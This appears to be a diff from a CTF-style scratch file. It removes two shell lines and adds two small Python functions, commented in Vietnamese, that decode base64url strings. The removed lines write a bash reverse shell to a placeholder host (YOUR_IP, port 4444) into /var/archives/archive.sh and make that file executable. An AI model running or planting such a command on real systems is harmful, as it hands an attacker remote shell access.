@@ -1,2 +1,43 @@
-echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /var/archives/archive.sh
-chmod +x /var/archives/archive.sh
+import base64
+
+def decode_base64url(data):
+    data += '=' * (-len(data) % 4)  # thêm padding nếu thiếu
+    data = data.replace('-', '+').replace('_', '/')
+    return base64.b64decode(data)
+
+b64 = ""
+decoded = decode_base64url(b64)
+print(decoded.hex())
+print(decoded)
+
+import base64
+import binascii
+
+def decode_base64_urlsafe(encoded_str):
+    try:
+        # Thêm padding nếu cần (Base64 yêu cầu độ dài chia hết cho 4)
+        padding_needed = len(encoded_str) % 4
+        if padding_needed:
+            encoded_str += '=' * (4 - padding_needed)
+        
+        # Giải mã Base64 URL-safe
+        decoded_bytes = base64.urlsafe_b64decode(encoded_str)
+        
+        # Thử chuyển thành văn bản UTF-8
+        try:
+            decoded_text = decoded_bytes.decode('utf-8')
+            print("Decoded as text:", decoded_text)
+        except UnicodeDecodeError:
+            # Nếu không phải văn bản UTF-8, in dạng hex (dữ liệu nhị phân)
+            print("Decoded as binary (hex):", decoded_bytes.hex())
+            print("Raw bytes:", decoded_bytes)
+        
+        return decoded_bytes
+    except binascii.Error as e:
+        print(f"Error decoding Base64: {e}")
+        return None
+
+# Chuỗi cần giải mã
+encoded = ""
+print("Encoded string:", encoded)
+decode_base64_urlsafe(encoded)
